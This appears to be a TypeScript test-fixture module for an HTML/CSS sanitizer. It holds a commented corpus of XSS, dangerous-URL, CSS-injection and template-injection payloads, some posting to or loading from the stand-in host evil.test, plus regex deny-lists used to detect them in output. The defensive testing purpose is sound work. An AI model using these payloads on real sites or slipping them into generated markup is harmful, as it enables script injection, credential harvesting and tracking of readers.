// The malicious fixture corpus (SPEC §9, "Security").
//
// Committed data rather than inline strings, for two reasons. A corpus is
// something you add to when the world teaches you something — a report, a CVE,
// a near miss — and that is easier when there is one obvious place to put it.
// And every case is driven through *every* sink that could plausibly receive
// it, so a payload written for rich text is also tried as a URL, a CSS value,
// and a section template. Most such pairings are uninteresting; the ones that
// are not are exactly the ones nobody thinks to write by hand.
//
// The rule for adding a case: it must be a thing an attacker would actually
// send, and the comment must say what it is trying to do. A fixture whose
// intent nobody can state is a fixture nobody will maintain.

export type Sink = 'html' | 'richtext' | 'url' | 'css'

export type MaliciousCase = {
  /** Stable id, used in test names. */
  id: string
  /** What the payload is trying to achieve, in one line. */
  intent: string
  /** The sink this was written against; it is tried against all of them. */
  sink: Sink
  payload: string
}

const TAB = String.fromCharCode(9)
const NUL = String.fromCharCode(0)
const NEWLINE = String.fromCharCode(10)

export const MALICIOUS_CASES: readonly MaliciousCase[] = [
  // ------------------------------------------------------------------ URLs
  {
    id: 'url-javascript',
    sink: 'url',
    payload: 'javascript:alert(1)',
    intent: 'the plain scheme, which everything else here is a disguise for',
  },
  {
    id: 'url-javascript-mixed-case',
    sink: 'url',
    payload: 'JaVaScRiPt:alert(1)',
    intent: 'defeat a case-sensitive prefix check',
  },
  {
    id: 'url-javascript-leading-space',
    sink: 'url',
    payload: '  javascript:alert(1)',
    intent: 'leading whitespace, which browsers strip and naive checks do not',
  },
  {
    id: 'url-javascript-tab',
    sink: 'url',
    payload: `jav${TAB}ascript:alert(1)`,
    intent: 'a tab inside the scheme, stripped by the URL parser',
  },
  {
    id: 'url-javascript-newline',
    sink: 'url',
    payload: `jav${NEWLINE}ascript:alert(1)`,
    intent: 'a newline inside the scheme',
  },
  {
    id: 'url-javascript-nul',
    sink: 'url',
    payload: `java${NUL}script:alert(1)`,
    intent: 'a NUL byte inside the scheme',
  },
  {
    id: 'url-javascript-entity',
    sink: 'url',
    payload: '&#106;avascript:alert(1)',
    intent: 'an HTML entity that the parser decodes back into the scheme',
  },
  {
    id: 'url-javascript-entity-hex',
    sink: 'url',
    payload: '&#x6a;avascript:alert(1)',
    intent: 'the hex form of the same entity',
  },
  { id: 'url-vbscript', sink: 'url', payload: 'vbscript:msgbox(1)', intent: 'the other executable scheme' },
  {
    id: 'url-data-html',
    sink: 'url',
    payload: 'data:text/html,<script>alert(1)</script>',
    intent: 'a data: document, which runs in the embedding origin when navigated to',
  },
  {
    id: 'url-data-svg',
    sink: 'url',
    payload: 'data:image/svg+xml,<svg onload=alert(1)>',
    intent: 'an SVG data: URL, executable when used as a document',
  },
  {
    id: 'url-data-base64',
    sink: 'url',
    payload: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    intent: 'the base64 form, past a check that only looks for angle brackets',
  },
  {
    id: 'url-protocol-relative',
    sink: 'url',
    payload: '//evil.test/steal',
    intent: 'off-site while looking like a path',
  },
  {
    id: 'url-backslash-relative',
    sink: 'url',
    payload: '\\\\evil.test/steal',
    intent: 'backslashes, which some parsers normalise to slashes',
  },
  {
    id: 'url-userinfo',
    sink: 'url',
    payload: 'https://trusted.test@evil.test/',
    intent: 'userinfo that makes the host look like the trusted one',
  },
  {
    id: 'url-blob',
    sink: 'url',
    payload: 'blob:https://evil.test/1234',
    intent: 'a blob URL, a document handle in disguise',
  },
  { id: 'url-file', sink: 'url', payload: 'file:///etc/passwd', intent: 'reach the reader’s filesystem' },
  {
    id: 'url-view-source',
    sink: 'url',
    payload: 'view-source:https://evil.test',
    intent: 'a scheme that is not navigation but is not inert either',
  },

  // -------------------------------------------------------------- rich text
  { id: 'rt-script', sink: 'richtext', payload: '<script>alert(1)</script>', intent: 'the baseline' },
  {
    id: 'rt-script-nested',
    sink: 'richtext',
    payload: '<scr<script>ipt>alert(1)</script>',
    intent: 'reassemble a tag out of the remains of a naive strip pass',
  },
  {
    id: 'rt-img-onerror',
    sink: 'richtext',
    payload: '<img src=x onerror=alert(1)>',
    intent: 'an event handler on an unquoted attribute',
  },
  { id: 'rt-onerror-quoted', sink: 'richtext', payload: '<img src="x" onerror="alert(1)">', intent: 'the quoted form' },
  {
    id: 'rt-onerror-newline',
    sink: 'richtext',
    payload: `<img src=x on${NEWLINE}error=alert(1)>`,
    intent: 'split the attribute name across a newline',
  },
  {
    id: 'rt-svg-script',
    sink: 'richtext',
    payload: '<svg><script>alert(1)</script></svg>',
    intent: 'SVG has its own script element',
  },
  { id: 'rt-svg-onload', sink: 'richtext', payload: '<svg onload=alert(1)></svg>', intent: 'SVG root event handler' },
  {
    id: 'rt-svg-animate',
    sink: 'richtext',
    payload: '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>',
    intent: 'SMIL animating an href into an executable scheme after load',
  },
  {
    id: 'rt-svg-use',
    sink: 'richtext',
    payload:
      '<svg><use href="data:image/svg+xml,&lt;svg id=&quot;x&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;#x"/></svg>',
    intent: 'pull an external SVG document in through <use>',
  },
  {
    id: 'rt-svg-foreignobject',
    sink: 'richtext',
    payload:
      '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>',
    intent: 'switch back into HTML parsing inside SVG',
  },
  {
    id: 'rt-math-polyglot',
    sink: 'richtext',
    payload: '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    intent: 'the MathML/HTML parser-confusion polyglot',
  },
  {
    id: 'rt-comment-breakout',
    sink: 'richtext',
    payload: '<!--><script>alert(1)</script>-->',
    intent: 'an early comment close that browsers accept and strippers do not',
  },
  {
    id: 'rt-cdata',
    sink: 'richtext',
    payload: '<![CDATA[<script>alert(1)</script>]]>',
    intent: 'CDATA, parsed as a bogus comment in HTML',
  },
  {
    id: 'rt-template',
    sink: 'richtext',
    payload: '<template><script>alert(1)</script></template>',
    intent: 'inert content that becomes live when cloned',
  },
  {
    id: 'rt-noscript',
    sink: 'richtext',
    payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    intent: 'the noscript parsing-mode change',
  },
  {
    id: 'rt-style-tag',
    sink: 'richtext',
    payload: '<style>@import url(//evil.test/x.css)</style>',
    intent: 'a stylesheet smuggled through rich text',
  },
  {
    id: 'rt-base',
    sink: 'richtext',
    payload: '<base href="//evil.test/">',
    intent: 'repoint every relative URL on the page',
  },
  {
    id: 'rt-meta-refresh',
    sink: 'richtext',
    payload: '<meta http-equiv="refresh" content="0;url=//evil.test">',
    intent: 'navigate the reader away',
  },
  {
    id: 'rt-form-action',
    sink: 'richtext',
    payload: '<form action="//evil.test"><input name="password"></form>',
    intent: 'a credential-harvesting form inside content',
  },
  {
    id: 'rt-iframe-srcdoc',
    sink: 'richtext',
    payload: '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
    intent: 'srcdoc, which is a document without a URL to filter',
  },
  {
    id: 'rt-object-data',
    sink: 'richtext',
    payload: '<object data="data:text/html,<script>alert(1)</script>"></object>',
    intent: 'the same document by another element',
  },
  {
    id: 'rt-a-javascript',
    sink: 'richtext',
    payload: '<a href="javascript:alert(1)">click</a>',
    intent: 'the allowed element carrying a disallowed scheme',
  },
  {
    id: 'rt-a-nested',
    sink: 'richtext',
    payload: '<a href="/a"><a href="//evil.test">x</a></a>',
    intent: 'nested anchors, which browsers reparent into a sibling that escapes the first link',
  },
  {
    id: 'rt-unbalanced-close',
    sink: 'richtext',
    payload: '</p></div></body><script>alert(1)</script>',
    intent: 'close the document out from under the surrounding page',
  },
  {
    id: 'rt-attribute-breakout',
    sink: 'richtext',
    payload: '<a href="/x" title="a&quot; onmouseover=&quot;alert(1)">x</a>',
    intent: 'break out of the attribute this value lands in',
  },
  {
    id: 'rt-unicode-tag',
    sink: 'richtext',
    payload: '＜script＞alert(1)＜/script＞',
    intent: 'fullwidth angle brackets, in case anything normalises them later',
  },

  // ---------------------------------------------------------- CSS and escapes
  { id: 'css-import', sink: 'css', payload: '@import url(//evil.test/x.css);', intent: 'load an off-site stylesheet' },
  {
    id: 'css-import-string',
    sink: 'css',
    payload: '@import "//evil.test/x.css";',
    intent: 'the string form of the same',
  },
  {
    id: 'css-import-escaped',
    sink: 'css',
    payload: '@\\69 mport url(//evil.test/x.css);',
    intent: 'escape the at-rule name past a literal match',
  },
  { id: 'css-expression', sink: 'css', payload: '.a{width:expression(alert(1))}', intent: 'legacy dynamic properties' },
  {
    id: 'css-expression-escaped',
    sink: 'css',
    payload: '.a{width:expr\\65 ssion(alert(1))}',
    intent: 'the same, with a hex escape in the middle',
  },
  {
    id: 'css-expression-comment',
    sink: 'css',
    payload: '.a{width:expr/**/ession(alert(1))}',
    intent: 'the same, split across a comment',
  },
  {
    id: 'css-javascript-url',
    sink: 'css',
    payload: '.a{background:url(javascript:alert(1))}',
    intent: 'an executable scheme inside url()',
  },
  {
    id: 'css-javascript-comment',
    sink: 'css',
    payload: '.a{background:java/**/script:alert(1)}',
    intent: 'a comment inside the scheme, which the tokenizer removes without leaving a space',
  },
  {
    id: 'css-javascript-escaped',
    sink: 'css',
    payload: '.a{background:\\6a\\61\\76\\61\\73\\63\\72\\69\\70\\74:alert(1)}',
    intent: 'the scheme spelled entirely in hex escapes',
  },
  {
    id: 'css-moz-binding',
    sink: 'css',
    payload: '.a{-moz-binding:url(//evil.test/x.xml)}',
    intent: 'XBL binding, which executes',
  },
  {
    id: 'css-moz-binding-escaped',
    sink: 'css',
    payload: '.a{-moz-b\\69 nding:url(//evil.test/x.xml)}',
    intent: 'the same with an escape in the property name',
  },
  { id: 'css-behavior', sink: 'css', payload: '.a{behavior:url(#default#time2)}', intent: 'the IE equivalent' },
  {
    id: 'css-offsite-url',
    sink: 'css',
    payload: '.a{background:url(https://evil.test/pixel.gif)}',
    intent: 'a tracking pixel — exfiltration without any script at all',
  },
  {
    id: 'css-offsite-url-escaped',
    sink: 'css',
    payload: '.a{background:url(\\2f \\2f evil.test/pixel.gif)}',
    intent: 'the protocol-relative form, spelled in escapes with the delimiting spaces',
  },
  {
    id: 'css-url-backslash-tail',
    sink: 'css',
    payload: '.a{background:url(/ok.png\\)}',
    intent: 'a trailing backslash that would escape the quote we re-emit it in',
  },
  {
    id: 'css-selector-brace-string',
    sink: 'css',
    payload: 'a[title="}"]{color:red}.b{color:blue}',
    intent: 'a closing brace inside a string, to desynchronise the tokenizer',
  },
  {
    id: 'css-selector-escape',
    sink: 'css',
    payload: 'body\\ .other{color:red}',
    intent: 'an escaped space, to look like a descendant of something outside the scope',
  },
  {
    id: 'css-scope-escape',
    sink: 'css',
    payload: '}body{display:none}.a{',
    intent: 'close our scope early and restyle the whole document',
  },
  {
    id: 'css-media-flatten',
    sink: 'css',
    payload: '@media (min-width:700px){.a{color:red}}',
    intent: 'not hostile — asserts the wrapper survives, because flattening it changes the layout',
  },
  {
    id: 'css-nested-media',
    sink: 'css',
    payload: '@media screen{@media (min-width:700px){.a{color:red}}}',
    intent: 'nesting, to check the parser recurses rather than mis-slicing',
  },
  {
    id: 'css-font-face',
    sink: 'css',
    payload: '@font-face{font-family:x;src:url(//evil.test/f.woff)}',
    intent: 'fetch an off-site font — a request the reader never asked for',
  },
  {
    id: 'css-charset',
    sink: 'css',
    payload: '@charset "UTF-7";',
    intent: 'change the document encoding to one with alternative angle brackets',
  },
  {
    id: 'css-style-breakout',
    sink: 'css',
    payload: '.a{color:red}</style><script>alert(1)</script>',
    intent: 'close the <style> element the CSS ships inside — the only tag that ends it',
  },
  {
    id: 'css-style-breakout-string',
    sink: 'css',
    payload: '.a{content:"</style><script>alert(1)</script>"}',
    intent: 'the same close tag hidden inside a string, where a value check would not look',
  },
  {
    id: 'css-style-breakout-escaped',
    sink: 'css',
    payload: '.a{content:"<\\2f style><script>alert(1)</script>"}',
    intent: 'the close tag with an escaped slash',
  },
  {
    id: 'css-selector-markup',
    sink: 'css',
    payload: '<section onclick="alert(1)">{color:red}',
    intent: 'markup in the selector position, which is not a selector at all',
  },

  // ---------------------------------------------- section templates (parser)
  {
    id: 'tpl-script',
    sink: 'html',
    payload: '<section><script>alert(1)</script></section>',
    intent: 'a script in an authored section template',
  },
  {
    id: 'tpl-onclick',
    sink: 'html',
    payload: '<section onclick="alert(1)">{{heading}}</section>',
    intent: 'an inline handler in a template',
  },
  {
    id: 'tpl-iframe',
    sink: 'html',
    payload: '<section><iframe src="//evil.test"></iframe></section>',
    intent: 'an embed in a template',
  },
  {
    id: 'tpl-form',
    sink: 'html',
    payload: '<section><form action="//evil.test"></form></section>',
    intent: 'a form in a template — the case nine real v1 sections actually hit',
  },
  {
    id: 'tpl-slot-injection',
    sink: 'html',
    payload: '<section>{{heading}}{{__proto__}}</section>',
    intent: 'a slot name that is also a JavaScript object key',
  },
  {
    id: 'tpl-duplicate-slot',
    sink: 'html',
    payload: '<section>{{heading}}{{heading}}</section>',
    intent: 'the same slot twice, which makes stable ids ambiguous',
  },
] as const

/**
 * Markers that must never appear in public output, whatever went in.
 *
 * Deliberately a single list applied to every fixture rather than a per-case
 * expectation: the cases that matter most are the ones nobody predicted, and a
 * per-case assertion can only fail in ways its author already imagined.
 */
export const FORBIDDEN_TAGS: readonly { name: string; pattern: RegExp }[] = [
  { name: 'script element', pattern: /<\s*script/i },
  { name: 'style element', pattern: /<\s*style/i },
  { name: 'iframe', pattern: /<\s*iframe/i },
  { name: 'object or embed', pattern: /<\s*(object|embed)\b/i },
  { name: 'form or input', pattern: /<\s*(form|input|button|textarea|select)\b/i },
  { name: 'base element', pattern: /<\s*base\b/i },
  { name: 'meta element', pattern: /<\s*meta\b/i },
  { name: 'link element', pattern: /<\s*link\b/i },
  { name: 'svg or math', pattern: /<\s*(svg|math|foreignObject)\b/i },
  { name: 'template element', pattern: /<\s*template\b/i },
  { name: 'event handler attribute', pattern: /\son[a-z]+\s*=/i },
  { name: 'srcdoc', pattern: /\bsrcdoc\s*=/i },
]

/**
 * Markers that are dangerous in an attribute value and harmless as visible text.
 *
 * The distinction is the whole point. `javascript:alert(1)` printed on the page
 * as words is a neutralised payload — it is what success looks like — while the
 * same string inside an `href` is the vulnerability. Testing both positions with
 * one list marks correct output as a failure, and a suite that cries wolf is a
 * suite people stop reading.
 */
export const FORBIDDEN_IN_ATTRIBUTES: readonly { name: string; pattern: RegExp }[] = [
  { name: 'javascript scheme', pattern: /javascript\s*:/i },
  { name: 'vbscript scheme', pattern: /vbscript\s*:/i },
  { name: 'data document', pattern: /data\s*:\s*(text\/html|image\/svg)/i },
  { name: 'css expression', pattern: /expression\s*\(/i },
  { name: 'moz binding', pattern: /-moz-binding/i },
  { name: 'css import', pattern: /@import/i },
  { name: 'off-site fetch', pattern: /(src|href|data|action|srcset|poster)\s*=/i },
]

/** Both lists, for callers that want the whole fragment judged at once. */
export const FORBIDDEN_IN_OUTPUT = FORBIDDEN_TAGS

export const FORBIDDEN_ANYWHERE = FORBIDDEN_TAGS.filter(f => !['style element', 'meta element'].includes(f.name))

/**
 * What must never appear in generated CSS.
 *
 * A different list from the HTML one, and deliberately so. Stylesheet text ships
 * inside a `<style>` element, where `<script>` is just characters — the only
 * thing that ends the element is a literal `</style>`, so that is the breakout
 * to hunt. Reusing the HTML list here would fail on inert text and teach
 * everyone to ignore it.
 */
export const FORBIDDEN_IN_CSS: readonly { name: string; pattern: RegExp }[] = [
  { name: 'style close tag', pattern: /<\s*\/\s*style/i },
  { name: 'javascript scheme', pattern: /javascript\s*:/i },
  { name: 'vbscript scheme', pattern: /vbscript\s*:/i },
  { name: 'css expression', pattern: /expression\s*\(/i },
  { name: 'moz binding', pattern: /-moz-binding/i },
  { name: 'behavior', pattern: /behaviou?r\s*:/i },
  { name: 'at-rule that loads', pattern: /@(import|charset|namespace|document)/i },
  { name: 'off-site host', pattern: /evil\.test/i },
  { name: 'markup in a selector', pattern: /<[a-zA-Z/]/ },
]
